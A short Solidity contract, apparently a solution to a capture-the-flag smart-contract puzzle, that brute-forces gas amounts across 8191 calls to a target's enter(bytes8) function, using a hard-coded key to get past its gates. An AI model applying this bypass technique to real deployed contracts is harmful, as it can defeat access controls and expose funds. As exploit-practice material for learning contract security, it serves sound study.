// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address public target;
    bool public top = false;
    bytes8 public data=0xaaaaaaaa0000b0B6;
    
    constructor(address _target){
        target = _target;
    }

    function attack() external{
        for(uint256 i=0;i<8191;i++){
           (bool result,) = target.call{gas:i+8191*3}(abi.encodeWithSignature("enter(bytes8)", data));
        }
    }
}